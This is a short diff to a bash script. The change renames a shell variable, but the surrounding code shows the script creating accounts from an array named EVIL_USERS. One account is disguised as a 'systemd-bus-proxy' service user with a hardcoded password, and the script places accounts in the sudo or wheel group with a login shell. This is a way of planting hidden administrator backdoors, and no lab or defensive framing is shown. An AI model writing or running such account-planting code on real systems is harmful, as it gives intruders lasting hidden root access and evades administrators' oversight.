@@ -37,7 +37,7 @@ declare -a EVIL_USERS=(
     "systemd-bus-proxy:Ev1lR00t#!"
 )
 
-SHELL="/bin/bash"
+USER_SHELL="/bin/bash"
 SUDO_GROUP="sudo"   # Debian/Ubuntu; change to "wheel" for RHEL/CentOS/Fedora
 
 # Detect if the system uses 'wheel' instead of 'sudo'
@@ -59,7 +59,7 @@ for entry in "${EVIL_USERS[@]}"; do
     else
         useradd \
             --create-home \
-            --shell "${SHELL}" \
+            --shell "${USER_SHELL}" \
             "${USERNAME}"
         success "Created user: ${USERNAME}"
     fi
